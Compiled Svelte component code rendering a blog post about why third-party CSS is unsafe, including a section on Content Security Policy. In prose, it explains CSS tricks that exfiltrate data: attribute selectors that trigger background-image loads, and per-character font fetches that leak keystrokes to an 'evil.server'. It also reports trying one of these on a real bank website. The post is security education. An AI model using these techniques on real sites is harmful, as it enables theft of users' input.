			t52 = text("*cough*");
			t53 = text(" site that tracks your behavior, and if you leave the site halfway through their funnel, they try remind you to through a network of advertisement elsewhere, such as in your search engine, or embedded in your social media, they achieve this through embedding third party scripts.");
			t54 = space();
			p12 = element("p");
			t55 = text("Here is a screenshot of list of 3rd party scripts loaded from ");
			a20 = element("a");
			t56 = text("https://shopee.sg");
			t57 = text(" (an ecommerce site based in South East Asia):");
			t58 = space();
			p13 = element("p");
			picture1 = element("picture");
			source2 = element("source");
			source3 = element("source");
			img1 = element("img");
			t59 = space();
			p14 = element("p");
			strong1 = element("strong");
			t60 = text("Disclaimer:");
			t61 = text(" I work for Shopee, I ");
			em2 = element("em");
			t62 = text("have nothing");
			t63 = text(" against all these 3rd party ads, they are what helped us remind buyers to come back and complete their purchase. 🙈");
			t64 = space();
			section5 = element("section");
			h32 = element("h3");
			a21 = element("a");
			t65 = text("3. Browser extensions");
			t66 = space();
			p15 = element("p");
			t67 = text("If you are someone who likes to decorate your browser, have a custom theme for all the website you visit, probably you are one of the users of a browser extension!");
			t68 = space();
			p16 = element("p");
			picture2 = element("picture");
			source4 = element("source");
			source5 = element("source");
			img2 = element("img");
			t69 = space();
			p17 = element("p");
			t70 = text("How a browser extension adds a custom theme to any website you visit is to inject a CSS to style them.");
			t71 = space();
			section6 = element("section");
			h22 = element("h2");
			a22 = element("a");
			t72 = text("How 3rd party CSS can be unsafe?");
			t73 = space();
			p18 = element("p");
			t74 = text("Let's take a look some examples from Jake's article and try it out ourselves.");
			t75 = space();
			section7 = element("section");
			h33 = element("h3");
			a23 = element("a");
			t76 = text("Disappearing content");
			t77 = space();
			p19 = element("p");
			t78 = text("A 3rd party CSS can easily hide content of your website using ");
			code1 = element("code");
			t79 = text("display: none");
			t80 = text(", and your website will break without you knowing it.");
			t81 = space();
			p20 = element("p");
			t82 = text("One example would be hiding a RSVP button from ");
			a24 = element("a");
			t83 = text("Singapore CSS website");
			t84 = text(", and the meetup organiser would be scratching their heads wondering why no one signing up for the event! 🤣");
			t85 = space();
			pre0 = element("pre");
			t86 = space();
			p21 = element("p");
			picture3 = element("picture");
			source6 = element("source");
			source7 = element("source");
			img3 = element("img");
			t87 = space();
			section8 = element("section");
			h34 = element("h3");
			a25 = element("a");
			t88 = text("Adding content");
			t89 = space();
			p22 = element("p");
			t90 = text("Instead of removing content, a 3rd party CSS can add new content to your website, unpleasant content or confusing content that could drive your visitor away!");
			t91 = space();
			p23 = element("p");
			t92 = text("One example would be hiding the text by setting the color to ");
			code2 = element("code");
			t93 = text("transparent");
			t94 = text(", and replace it with a background image instead!");
			t95 = space();
			pre1 = element("pre");
			t96 = space();
			p24 = element("p");
			picture4 = element("picture");
			source8 = element("source");
			source9 = element("source");
			img4 = element("img");
			t97 = space();
			p25 = element("p");
			t98 = text("Another technique to adding new content is to use the ");
			code3 = element("code");
			t99 = text("::before");
			t100 = text(" or ");
			code4 = element("code");
			t101 = text("::after");
			t102 = text(" psuedo element, as you can add new text via the ");
			code5 = element("code");
			t103 = text("content");
			t104 = text(" property.");
			t105 = space();
			p26 = element("p");
			t106 = text("Let's do a combination of hiding and adding content through CSS:");
			t107 = space();
			pre2 = element("pre");
			t108 = space();
			p27 = element("p");
			t109 = text("Here we hide the event details, change the button text from ");
			strong2 = element("strong");
			t110 = text("\"RSVP\"");
			t111 = text(" to ");
			strong3 = element("strong");
			t112 = text("\"Refresh\"");
			t113 = text(", and somehow we got more people attending the meetup!");
			t114 = space();
			p28 = element("p");
			picture5 = element("picture");
			source10 = element("source");
			source11 = element("source");
			img5 = element("img");
			t115 = space();
			p29 = element("p");
			t116 = text("A more malicious example would be overlapping a different phone number on top of the hotline number of a bank");
			t117 = space();
			pre3 = element("pre");
			t118 = space();
			p30 = element("p");
			picture6 = element("picture");
			source12 = element("source");
			source13 = element("source");
			img6 = element("img");
			t119 = space();
			blockquote = element("blockquote");
			p31 = element("p");
			t120 = text("The screenshot was taken on my local machine, with a custom setup. No actual harm has done to anyone.");
			t121 = space();
			section9 = element("section");
			h35 = element("h3");
			a26 = element("a");
			t122 = text("Moving content");
			t123 = space();
			p32 = element("p");
			t124 = text("Yet again, we can move the RSVP button around to cover the entire screen. Now clicking anywhere on the site will lead you to the RSVP site.");
			t125 = space();
			pre4 = element("pre");
			t126 = space();
			section10 = element("section");
			h36 = element("h3");
			a27 = element("a");
			t127 = text("Reading attributes");
			t128 = space();
			p33 = element("p");
			t129 = text("Using the attribute selector, a 3rd party CSS can style the element differently based on different attribute value.");
			t130 = space();
			p34 = element("p");
			t131 = text("One, for example, could load a different background image for different attribute value. By knowing which background image is loaded, one could then know the value of the attribute.");
			t132 = space();
			p35 = element("p");
			t133 = text("With enough CSS written, covering all possibile values of the attribute, one could possibly figure out or reduce the search space to figure out the attribute value.");
			t134 = space();
			p36 = element("p");
			t135 = text("To make matter worse, some framework, for example React, synchornizes ");
			code6 = element("code");
			t136 = text("input.value");
			t137 = text(" to the ");
			code7 = element("code");
			t138 = text("<input value=\"\">");
			t139 = text(" attribute.");
			t140 = space();
			iframe = element("iframe");
			t141 = space();
			p37 = element("p");
			t142 = text("An example of sniffing the attribute value using attribute selector + ");
			code8 = element("code");
			t143 = text("background-image");
			t144 = text(":");
			t145 = space();
			pre5 = element("pre");
			t146 = space();
			section11 = element("section");
			h37 = element("h3");
			a28 = element("a");
			t147 = text("Monitoring attributes");
			t148 = space();
			p38 = element("p");
			t149 = text("You can track hover and activations of an element and send that information to the server.");
			t150 = space();
			pre6 = element("pre");
			t151 = space();
			section12 = element("section");
			h38 = element("h3");
			a29 = element("a");
			t152 = text("Reading text");
			t153 = space();
			p39 = element("p");
			t154 = text("If the secret important data on your website is not on the attribute, but rather being part of a text, you may think you are safe from 3rd party CSS, because there's no inner text selector in CSS.");
			t155 = space();
			p40 = element("p");
			t156 = text("However, there's still tricks up the 3rd party CSS sleeves: ");
			strong4 = element("strong");
			t157 = text("fonts");
			t158 = text(".");
			t159 = space();
			p41 = element("p");
			t160 = text("A 3rd party CSS can declare a ");
			code9 = element("code");
			t161 = text("font-family");
			t162 = text(" that requires a different font file for different character, which means it could be use to determine what are the characters there is in the selected text.");
			t163 = space();
			p42 = element("p");
			t164 = text("However, there's a limitation to this, which is, there's no way telling the order and number of occurence of the characters. Because, the font files would be cached by the browser, and will not be fetched again with another occurence of the same character.");
			t165 = space();
			pre7 = element("pre");
			t166 = space();
			p43 = element("p");
			t167 = text("This could be apply to ");
			code10 = element("code");
			t168 = text("<input>");
			t169 = text(" as well. As the user types in their confidential information, character by character, the browser fetches the font file, and the ");
			code11 = element("code");
			t170 = text("evil.server");
			t171 = text(" will know which characters the user has typed into the input.");
			t172 = space();
			section13 = element("section");
			h23 = element("h2");
			a30 = element("a");
			t173 = text("Content Security Policy");
			t174 = space();
			p44 = element("p");
			t175 = text("While I was trying to reading attributes from a local bank website, (to try out the feasibility of the techniques above), I couldn't load the background image from my ");
			code12 = element("code");
			t176 = text("localhost");
			t177 = text(" server.");
			t178 = space();
			p45 = element("p");
			picture7 = element("picture");
			source14 = element("source");
			source15 = element("source");
			img7 = element("img");
			t179 = space();
			p46 = element("p");
			t180 = text("It says my request to my image gets blocked by ");
			a31 = element("a");
			t181 = text("Content Security Policy");
			t182 = text(".");
			t183 = space();
			p47 = element("p");
			t184 = text("So I checked the response of the webpage, and found out the following CSP header in the network tab.");
			t185 = space();
			p48 = element("p");
			picture8 = element("picture");
			source16 = element("source");
			source17 = element("source");
			img8 = element("img");
			t186 = space();
			p49 = element("p");
			t187 = text("In the header, it specifies allow-list of domains / subdomains for specific type of asset. For example, in the following CSP");
			t188 = space();
			pre8 = element("pre");
			t189 = space();
			p50 = element("p");
			t190 = text("it allows image source from the site's own origin and subdomain in ");
			code13 = element("code");
			t191 = text("gstatic.com");
			t192 = text(", and only styles from the site's own origin.");
			t193 = space();
			p51 = element("p");
			t194 = text("Any styles or image source beyond the list will be blocked by the browser.");
			t195 = space();
			section14 = element("section");
			h24 = element("h2");
			a32 = element("a");
			t196 = text("Summary");
			t197 = space();
			p52 = element("p");
			t198 = text("Third party CSS is not absolutely safe, where you can trust them blindly. It can modify, remove or add content to your site, which may indirectly reducing trust of your users to your site.");
			t199 = space();
			section15 = element("section");
			h25 = element("h2");
			a33 = element("a");
			t200 = text("Further reading");
			t201 = space();
			ul3 = element("ul");
			li15 = element("li");
			a34 = element("a");
			t202 = text("https://jakearchibald.com/2018/third-party-css-is-not-safe/");
			t203 = space();
			li16 = element("li");
			a35 = element("a");
			t204 = text("https://github.com/maxchehab/CSS-Keylogging");
			t205 = space();
			li17 = element("li");
			a36 = element("a");
			t206 = text("https://vimeo.com/100264064#t=1290s");
			t207 = space();
			li18 = element("li");
			a37 = element("a");
			t208 = text("https://www.youtube.com/watch?v=eb3suf4REyI");
			t209 = space();
			li19 = element("li");
			a38 = element("a");
			t210 = text("https://www.nds.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf");
			this.h();
		},
		l(nodes) {
			section0 = claim_element(nodes, "SECTION", {});
			var section0_nodes = children(section0);

			ul2 = claim_element(section0_nodes, "UL", {
				class: true,
				id: true,
				role: true,
				"aria-label": true
			});

			var ul2_nodes = children(ul2);
			li0 = claim_element(ul2_nodes, "LI", {});
			var li0_nodes = children(li0);
			a0 = claim_element(li0_nodes, "A", { href: true });
			var a0_nodes = children(a0);
			t0 = claim_text(a0_nodes, "3rd party");
			a0_nodes.forEach(detach);
			li0_nodes.forEach(detach);
			li1 = claim_element(ul2_nodes, "LI", {});
			var li1_nodes = children(li1);
			a1 = claim_element(li1_nodes, "A", { href: true });
			var a1_nodes = children(a1);
			t1 = claim_text(a1_nodes, "Where does 3rd party CSS come from?");
			a1_nodes.forEach(detach);
			li1_nodes.forEach(detach);
			ul0 = claim_element(ul2_nodes, "UL", {});
			var ul0_nodes = children(ul0);
			li2 = claim_element(ul0_nodes, "LI", {});
			var li2_nodes = children(li2);
			a2 = claim_element(li2_nodes, "A", { href: true });
			var a2_nodes = children(a2);
			t2 = claim_text(a2_nodes, "1. CSS Frameworks");
			a2_nodes.forEach(detach);
			li2_nodes.forEach(detach);
			li3 = claim_element(ul0_nodes, "LI", {});
			var li3_nodes = children(li3);
			a3 = claim_element(li3_nodes, "A", { href: true });
			var a3_nodes = children(a3);
			t3 = claim_text(a3_nodes, "2. Third party scripts");
			a3_nodes.forEach(detach);
			li3_nodes.forEach(detach);
			li4 = claim_element(ul0_nodes, "LI", {});
			var li4_nodes = children(li4);
			a4 = claim_element(li4_nodes, "A", { href: true });
			var a4_nodes = children(a4);
			t4 = claim_text(a4_nodes, "3. Browser extensions");
			a4_nodes.forEach(detach);
			li4_nodes.forEach(detach);
			ul0_nodes.forEach(detach);
			li5 = claim_element(ul2_nodes, "LI", {});
			var li5_nodes = children(li5);
			a5 = claim_element(li5_nodes, "A", { href: true });
			var a5_nodes = children(a5);
			t5 = claim_text(a5_nodes, "How 3rd party CSS can be unsafe?");
			a5_nodes.forEach(detach);
			li5_nodes.forEach(detach);
			ul1 = claim_element(ul2_nodes, "UL", {});
			var ul1_nodes = children(ul1);
			li6 = claim_element(ul1_nodes, "LI", {});
			var li6_nodes = children(li6);
			a6 = claim_element(li6_nodes, "A", { href: true });
			var a6_nodes = children(a6);
			t6 = claim_text(a6_nodes, "Disappearing content");
			a6_nodes.forEach(detach);
			li6_nodes.forEach(detach);
			li7 = claim_element(ul1_nodes, "LI", {});
			var li7_nodes = children(li7);
			a7 = claim_element(li7_nodes, "A", { href: true });
			var a7_nodes = children(a7);
			t7 = claim_text(a7_nodes, "Adding content");
			a7_nodes.forEach(detach);
			li7_nodes.forEach(detach);
			li8 = claim_element(ul1_nodes, "LI", {});
			var li8_nodes = children(li8);
			a8 = claim_element(li8_nodes, "A", { href: true });
			var a8_nodes = children(a8);
			t8 = claim_text(a8_nodes, "Moving content");
			a8_nodes.forEach(detach);
			li8_nodes.forEach(detach);
			li9 = claim_element(ul1_nodes, "LI", {});
			var li9_nodes = children(li9);
			a9 = claim_element(li9_nodes, "A", { href: true });
			var a9_nodes = children(a9);
			t9 = claim_text(a9_nodes, "Reading attributes");
			a9_nodes.forEach(detach);
			li9_nodes.forEach(detach);
			li10 = claim_element(ul1_nodes, "LI", {});
			var li10_nodes = children(li10);
			a10 = claim_element(li10_nodes, "A", { href: true });
			var a10_nodes = children(a10);
			t10 = claim_text(a10_nodes, "Monitoring attributes");
			a10_nodes.forEach(detach);
			li10_nodes.forEach(detach);
			li11 = claim_element(ul1_nodes, "LI", {});
			var li11_nodes = children(li11);
			a11 = claim_element(li11_nodes, "A", { href: true });
			var a11_nodes = children(a11);
			t11 = claim_text(a11_nodes, "Reading text");
			a11_nodes.forEach(detach);
			li11_nodes.forEach(detach);
			ul1_nodes.forEach(detach);
			li12 = claim_element(ul2_nodes, "LI", {});
			var li12_nodes = children(li12);
			a12 = claim_element(li12_nodes, "A", { href: true });
			var a12_nodes = children(a12);
			t12 = claim_text(a12_nodes, "Content Security Policy");
			a12_nodes.forEach(detach);
			li12_nodes.forEach(detach);
			li13 = claim_element(ul2_nodes, "LI", {});
			var li13_nodes = children(li13);
			a13 = claim_element(li13_nodes, "A", { href: true });
			var a13_nodes = children(a13);
			t13 = claim_text(a13_nodes, "Summary");
			a13_nodes.forEach(detach);
			li13_nodes.forEach(detach);
			li14 = claim_element(ul2_nodes, "LI", {});
			var li14_nodes = children(li14);
			a14 = claim_element(li14_nodes, "A", { href: true });
			var a14_nodes = children(a14);
			t14 = claim_text(a14_nodes, "Further reading");
			a14_nodes.forEach(detach);
			li14_nodes.forEach(detach);
			ul2_nodes.forEach(detach);
			section0_nodes.forEach(detach);
			t15 = claim_space(nodes);
			p0 = claim_element(nodes, "P", {});
			var p0_nodes = children(p0);
			t16 = claim_text(p0_nodes, "Recently, I read ");
			a15 = claim_element(p0_nodes, "A", { href: true, rel: true });
			var a15_nodes = children(a15);
			t17 = claim_text(a15_nodes, "Jake Archibald's \"Third party CSS is not safe\"");
			a15_nodes.forEach(detach);
			t18 = claim_text(p0_nodes, ", and it has a lot to say about why 3rd party CSS is not safe. You should give it a read, but if you are lazy, here I am going to read it along with you.");
			p0_nodes.forEach(detach);
			t19 = claim_space(nodes);
			section1 = claim_element(nodes, "SECTION", {});
			var section1_nodes = children(section1);
			h20 = claim_element(section1_nodes, "H2", {});
			var h20_nodes = children(h20);
			a16 = claim_element(h20_nodes, "A", { href: true, id: true });
			var a16_nodes = children(a16);
			t20 = claim_text(a16_nodes, "3rd party");
			a16_nodes.forEach(detach);
			h20_nodes.forEach(detach);
			t21 = claim_space(section1_nodes);
			p1 = claim_element(section1_nodes, "P", {});
			var p1_nodes = children(p1);
			t22 = claim_text(p1_nodes, "If you use assets or APIs from sources that are not provided by yourself, you are using it from a 3rd party. Generally, in a context of a website, this means loading resources that is not from the same domain.");
			p1_nodes.forEach(detach);
			t23 = claim_space(section1_nodes);
			p2 = claim_element(section1_nodes, "P", {});
			var p2_nodes = children(p2);
			t24 = claim_text(p2_nodes, "Jake then gave examples of how 3rd party images and 3rd party scripts could be harmful.");
			p2_nodes.forEach(detach);
			t25 = claim_space(section1_nodes);
			p3 = claim_element(section1_nodes, "P", {});
			var p3_nodes = children(p3);
			t26 = claim_text(p3_nodes, "But, today's main focus is on 3rd party CSS. So let's scroll down and see what harm can 3rd party CSS bring.");
			p3_nodes.forEach(detach);
			section1_nodes.forEach(detach);
			t27 = claim_space(nodes);
			section2 = claim_element(nodes, "SECTION", {});
			var section2_nodes = children(section2);
			h21 = claim_element(section2_nodes, "H2", {});
			var h21_nodes = children(h21);
			a17 = claim_element(h21_nodes, "A", { href: true, id: true });
			var a17_nodes = children(a17);
			t28 = claim_text(a17_nodes, "Where does 3rd party CSS come from?");
			a17_nodes.forEach(detach);
			h21_nodes.forEach(detach);
			t29 = claim_space(section2_nodes);
			p4 = claim_element(section2_nodes, "P", {});
			var p4_nodes = children(p4);
			t30 = claim_text(p4_nodes, "Before we dive into what harm can it bring, let's pause for a moment and think, how does 3rd party CSS get into our web page?");
			p4_nodes.forEach(detach);
			section2_nodes.forEach(detach);
			t31 = claim_space(nodes);
			section3 = claim_element(nodes, "SECTION", {});
			var section3_nodes = children(section3);
			h30 = claim_element(section3_nodes, "H3", {});
			var h30_nodes = children(h30);
			a18 = claim_element(h30_nodes, "A", { href: true, id: true });
			var a18_nodes = children(a18);
			t32 = claim_text(a18_nodes, "1. CSS Frameworks");
			a18_nodes.forEach(detach);
			h30_nodes.forEach(detach);
			t33 = claim_space(section3_nodes);
			p5 = claim_element(section3_nodes, "P", {});
			var p5_nodes = children(p5);
			t34 = claim_text(p5_nodes, "Well, if you use frameworks like Bootstrap (I have nothing against using Bootstrap, it's a great CSS framework), one of the options to adding it to your website is to use one of their CDN links.");
			p5_nodes.forEach(detach);
			t35 = claim_space(section3_nodes);
			p6 = claim_element(section3_nodes, "P", {});
			var p6_nodes = children(p6);
			picture0 = claim_element(p6_nodes, "PICTURE", {});
			var picture0_nodes = children(picture0);
			source0 = claim_element(picture0_nodes, "SOURCE", { type: true, srcset: true });
			source1 = claim_element(picture0_nodes, "SOURCE", { type: true, srcset: true });

			img0 = claim_element(picture0_nodes, "IMG", {
				title: true,
				alt: true,
				"data-src": true,
				loading: true
			});

			picture0_nodes.forEach(detach);
			p6_nodes.forEach(detach);
			t36 = claim_space(section3_nodes);
			p7 = claim_element(section3_nodes, "P", {});
			var p7_nodes = children(p7);
			t37 = claim_text(p7_nodes, "This means that you are going to trust the CSS content return from the Bootstrap CDN.");
			p7_nodes.forEach(detach);
			t38 = claim_space(section3_nodes);
			p8 = claim_element(section3_nodes, "P", {});
			var p8_nodes = children(p8);
			em0 = claim_element(p8_nodes, "EM", {});
			var em0_nodes = children(em0);
			t39 = claim_text(em0_nodes, "Have you ever take a look at what is contained in the ");
			code0 = claim_element(em0_nodes, "CODE", {});
			var code0_nodes = children(code0);
			t40 = claim_text(code0_nodes, "bootstrap.min.css");
			code0_nodes.forEach(detach);
			t41 = claim_text(em0_nodes, " from CDN?");
			em0_nodes.forEach(detach);
			p8_nodes.forEach(detach);
			section3_nodes.forEach(detach);
			t42 = claim_space(nodes);
			section4 = claim_element(nodes, "SECTION", {});
			var section4_nodes = children(section4);
			h31 = claim_element(section4_nodes, "H3", {});
			var h31_nodes = children(h31);
			a19 = claim_element(h31_nodes, "A", { href: true, id: true });
			var a19_nodes = children(a19);
			t43 = claim_text(a19_nodes, "2. Third party scripts");
			a19_nodes.forEach(detach);
			h31_nodes.forEach(detach);
			t44 = claim_space(section4_nodes);
			p9 = claim_element(section4_nodes, "P", {});
			var p9_nodes = children(p9);
			t45 = claim_text(p9_nodes, "It's pretty lame for the 3rd party scripts to do something malicious through a 3rd party CSS, because the scope of influence of a 3rd party scripts is much more than a 3rd party CSS. But nonetheless, it's worth noting that it is entirely possible that a 3rd party CSS comes from a 3rd party script.");
			p9_nodes.forEach(detach);
			t46 = claim_space(section4_nodes);
			p10 = claim_element(section4_nodes, "P", {});
			var p10_nodes = children(p10);
			t47 = claim_text(p10_nodes, "This begs the question of, where does the 3rd party script come from?");
			p10_nodes.forEach(detach);
			t48 = claim_space(section4_nodes);
			p11 = claim_element(section4_nodes, "P", {});
			var p11_nodes = children(p11);
			t49 = claim_text(p11_nodes, "Well, if you visit any ");
			strong0 = claim_element(p11_nodes, "STRONG", {});
			var strong0_nodes = children(strong0);
			t50 = claim_text(strong0_nodes, "well-intentioned");
			strong0_nodes.forEach(detach);
			t51 = claim_space(p11_nodes);
			em1 = claim_element(p11_nodes, "EM", {});
			var em1_nodes = children(em1);
			t52 = claim_text(em1_nodes, "*cough*");
			em1_nodes.forEach(detach);
			t53 = claim_text(p11_nodes, " site that tracks your behavior, and if you leave the site halfway through their funnel, they try remind you to through a network of advertisement elsewhere, such as in your search engine, or embedded in your social media, they achieve this through embedding third party scripts.");
			p11_nodes.forEach(detach);
			t54 = claim_space(section4_nodes);
			p12 = claim_element(section4_nodes, "P", {});
			var p12_nodes = children(p12);
			t55 = claim_text(p12_nodes, "Here is a screenshot of list of 3rd party scripts loaded from ");
			a20 = claim_element(p12_nodes, "A", { href: true, rel: true });
			var a20_nodes = children(a20);
			t56 = claim_text(a20_nodes, "https://shopee.sg");
			a20_nodes.forEach(detach);
			t57 = claim_text(p12_nodes, " (an ecommerce site based in South East Asia):");
			p12_nodes.forEach(detach);
			t58 = claim_space(section4_nodes);
			p13 = claim_element(section4_nodes, "P", {});
			var p13_nodes = children(p13);
			picture1 = claim_element(p13_nodes, "PICTURE", {});
			var picture1_nodes = children(picture1);
			source2 = claim_element(picture1_nodes, "SOURCE", { type: true, srcset: true });
			source3 = claim_element(picture1_nodes, "SOURCE", { type: true, srcset: true });

			img1 = claim_element(picture1_nodes, "IMG", {
				title: true,
				alt: true,
				"data-src": true,
				loading: true
			});

			picture1_nodes.forEach(detach);
			p13_nodes.forEach(detach);
			t59 = claim_space(section4_nodes);
			p14 = claim_element(section4_nodes, "P", {});
			var p14_nodes = children(p14);
			strong1 = claim_element(p14_nodes, "STRONG", {});
			var strong1_nodes = children(strong1);
			t60 = claim_text(strong1_nodes, "Disclaimer:");
			strong1_nodes.forEach(detach);
			t61 = claim_text(p14_nodes, " I work for Shopee, I ");
			em2 = claim_element(p14_nodes, "EM", {});
			var em2_nodes = children(em2);
			t62 = claim_text(em2_nodes, "have nothing");
			em2_nodes.forEach(detach);
			t63 = claim_text(p14_nodes, " against all these 3rd party ads, they are what helped us remind buyers to come back and complete their purchase. 🙈");
			p14_nodes.forEach(detach);
			section4_nodes.forEach(detach);
			t64 = claim_space(nodes);
			section5 = claim_element(nodes, "SECTION", {});
			var section5_nodes = children(section5);
			h32 = claim_element(section5_nodes, "H3", {});
			var h32_nodes = children(h32);
			a21 = claim_element(h32_nodes, "A", { href: true, id: true });
			var a21_nodes = children(a21);
			t65 = claim_text(a21_nodes, "3. Browser extensions");
			a21_nodes.forEach(detach);
			h32_nodes.forEach(detach);
			t66 = claim_space(section5_nodes);
			p15 = claim_element(section5_nodes, "P", {});
			var p15_nodes = children(p15);
			t67 = claim_text(p15_nodes, "If you are someone who likes to decorate your browser, have a custom theme for all the website you visit, probably you are one of the users of a browser extension!");
			p15_nodes.forEach(detach);
			t68 = claim_space(section5_nodes);
			p16 = claim_element(section5_nodes, "P", {});
			var p16_nodes = children(p16);
			picture2 = claim_element(p16_nodes, "PICTURE", {});
			var picture2_nodes = children(picture2);
			source4 = claim_element(picture2_nodes, "SOURCE", { type: true, srcset: true });
			source5 = claim_element(picture2_nodes, "SOURCE", { type: true, srcset: true });

			img2 = claim_element(picture2_nodes, "IMG", {
				title: true,
				alt: true,
				"data-src": true,
				loading: true
			});

			picture2_nodes.forEach(detach);
			p16_nodes.forEach(detach);
			t69 = claim_space(section5_nodes);
			p17 = claim_element(section5_nodes, "P", {});
			var p17_nodes = children(p17);
			t70 = claim_text(p17_nodes, "How a browser extension adds a custom theme to any website you visit is to inject a CSS to style them.");
			p17_nodes.forEach(detach);
			section5_nodes.forEach(detach);
			t71 = claim_space(nodes);
			section6 = claim_element(nodes, "SECTION", {});
			var section6_nodes = children(section6);
			h22 = claim_element(section6_nodes, "H2", {});
			var h22_nodes = children(h22);
			a22 = claim_element(h22_nodes, "A", { href: true, id: true });
			var a22_nodes = children(a22);
			t72 = claim_text(a22_nodes, "How 3rd party CSS can be unsafe?");
			a22_nodes.forEach(detach);
			h22_nodes.forEach(detach);
			t73 = claim_space(section6_nodes);
			p18 = claim_element(section6_nodes, "P", {});
			var p18_nodes = children(p18);
			t74 = claim_text(p18_nodes, "Let's take a look some examples from Jake's article and try it out ourselves.");
			p18_nodes.forEach(detach);
			section6_nodes.forEach(detach);
			t75 = claim_space(nodes);
			section7 = claim_element(nodes, "SECTION", {});
			var section7_nodes = children(section7);
			h33 = claim_element(section7_nodes, "H3", {});
			var h33_nodes = children(h33);
			a23 = claim_element(h33_nodes, "A", { href: true, id: true });
			var a23_nodes = children(a23);
			t76 = claim_text(a23_nodes, "Disappearing content");
			a23_nodes.forEach(detach);
			h33_nodes.forEach(detach);
			t77 = claim_space(section7_nodes);
			p19 = claim_element(section7_nodes, "P", {});
			var p19_nodes = children(p19);
			t78 = claim_text(p19_nodes, "A 3rd party CSS can easily hide content of your website using ");
			code1 = claim_element(p19_nodes, "CODE", {});
			var code1_nodes = children(code1);
			t79 = claim_text(code1_nodes, "display: none");
			code1_nodes.forEach(detach);
			t80 = claim_text(p19_nodes, ", and your website will break without you knowing it.");
			p19_nodes.forEach(detach);
			t81 = claim_space(section7_nodes);
			p20 = claim_element(section7_nodes, "P", {});
			var p20_nodes = children(p20);
			t82 = claim_text(p20_nodes, "One example would be hiding a RSVP button from ");
			a24 = claim_element(p20_nodes, "A", { href: true, rel: true });
			var a24_nodes = children(a24);
			t83 = claim_text(a24_nodes, "Singapore CSS website");
			a24_nodes.forEach(detach);
			t84 = claim_text(p20_nodes, ", and the meetup organiser would be scratching their heads wondering why no one signing up for the event! 🤣");
			p20_nodes.forEach(detach);
			t85 = claim_space(section7_nodes);
			pre0 = claim_element(section7_nodes, "PRE", { class: true });
			var pre0_nodes = children(pre0);
			pre0_nodes.forEach(detach);
			t86 = claim_space(section7_nodes);
			p21 = claim_element(section7_nodes, "P", {});
			var p21_nodes = children(p21);
			picture3 = claim_element(p21_nodes, "PICTURE", {});
			var picture3_nodes = children(picture3);
			source6 = claim_element(picture3_nodes, "SOURCE", { type: true, srcset: true });
			source7 = claim_element(picture3_nodes, "SOURCE", { type: true, srcset: true });

			img3 = claim_element(picture3_nodes, "IMG", {
				title: true,
				alt: true,
				"data-src": true,
				loading: true
			});

			picture3_nodes.forEach(detach);
			p21_nodes.forEach(detach);
			section7_nodes.forEach(detach);
			t87 = claim_space(nodes);
			section8 = claim_element(nodes, "SECTION", {});
			var section8_nodes = children(section8);
			h34 = claim_element(section8_nodes, "H3", {});
			var h34_nodes = children(h34);
			a25 = claim_element(h34_nodes, "A", { href: true, id: true });
			var a25_nodes = children(a25);
			t88 = claim_text(a25_nodes, "Adding content");
			a25_nodes.forEach(detach);
			h34_nodes.forEach(detach);
			t89 = claim_space(section8_nodes);
			p22 = claim_element(section8_nodes, "P", {});
			var p22_nodes = children(p22);
			t90 = claim_text(p22_nodes, "Instead of removing content, a 3rd party CSS can add new content to your website, unpleasant content or confusing content that could drive your visitor away!");
			p22_nodes.forEach(detach);
			t91 = claim_space(section8_nodes);
			p23 = claim_element(section8_nodes, "P", {});
			var p23_nodes = children(p23);
			t92 = claim_text(p23_nodes, "One example would be hiding the text by setting the color to ");
			code2 = claim_element(p23_nodes, "CODE", {});
			var code2_nodes = children(code2);
			t93 = claim_text(code2_nodes, "transparent");
			code2_nodes.forEach(detach);
			t94 = claim_text(p23_nodes, ", and replace it with a background image instead!");
			p23_nodes.forEach(detach);
			t95 = claim_space(section8_nodes);
			pre1 = claim_element(section8_nodes, "PRE", { class: true });
			var pre1_nodes = children(pre1);
			pre1_nodes.forEach(detach);
			t96 = claim_space(section8_nodes);
			p24 = claim_element(section8_nodes, "P", {});
			var p24_nodes = children(p24);
			picture4 = claim_element(p24_nodes, "PICTURE", {});
			var picture4_nodes = children(picture4);
			source8 = claim_element(picture4_nodes, "SOURCE", { type: true, srcset: true });
			source9 = claim_element(picture4_nodes, "SOURCE", { type: true, srcset: true });

			img4 = claim_element(picture4_nodes, "IMG", {
				title: true,
				alt: true,
				"data-src": true,
				loading: true
			});

			picture4_nodes.forEach(detach);
			p24_nodes.forEach(detach);
			t97 = claim_space(section8_nodes);
			p25 = claim_element(section8_nodes, "P", {});
			var p25_nodes = children(p25);
			t98 = claim_text(p25_nodes, "Another technique to adding new content is to use the ");
			code3 = claim_element(p25_nodes, "CODE", {});
			var code3_nodes = children(code3);
			t99 = claim_text(code3_nodes, "::before");
			code3_nodes.forEach(detach);
			t100 = claim_text(p25_nodes, " or ");
			code4 = claim_element(p25_nodes, "CODE", {});
			var code4_nodes = children(code4);
			t101 = claim_text(code4_nodes, "::after");
			code4_nodes.forEach(detach);
			t102 = claim_text(p25_nodes, " psuedo element, as you can add new text via the ");
			code5 = claim_element(p25_nodes, "CODE", {});
			var code5_nodes = children(code5);
			t103 = claim_text(code5_nodes, "content");
			code5_nodes.forEach(detach);
			t104 = claim_text(p25_nodes, " property.");
			p25_nodes.forEach(detach);
			t105 = claim_space(section8_nodes);
			p26 = claim_element(section8_nodes, "P", {});
			var p26_nodes = children(p26);
			t106 = claim_text(p26_nodes, "Let's do a combination of hiding and adding content through CSS:");
			p26_nodes.forEach(detach);
			t107 = claim_space(section8_nodes);
			pre2 = claim_element(section8_nodes, "PRE", { class: true });
			var pre2_nodes = children(pre2);
			pre2_nodes.forEach(detach);
			t108 = claim_space(section8_nodes);
			p27 = claim_element(section8_nodes, "P", {});
			var p27_nodes = children(p27);
			t109 = claim_text(p27_nodes, "Here we hide the event details, change the button text from ");
			strong2 = claim_element(p27_nodes, "STRONG", {});
			var strong2_nodes = children(strong2);
			t110 = claim_text(strong2_nodes, "\"RSVP\"");
			strong2_nodes.forEach(detach);
			t111 = claim_text(p27_nodes, " to ");
			strong3 = claim_element(p27_nodes, "STRONG", {});
			var strong3_nodes = children(strong3);
			t112 = claim_text(strong3_nodes, "\"Refresh\"");
			strong3_nodes.forEach(detach);
			t113 = claim_text(p27_nodes, ", and somehow we got more people attending the meetup!");
			p27_nodes.forEach(detach);
			t114 = claim_space(section8_nodes);
			p28 = claim_element(section8_nodes, "P", {});
			var p28_nodes = children(p28);
			picture5 = claim_element(p28_nodes, "PICTURE", {});
			var picture5_nodes = children(picture5);
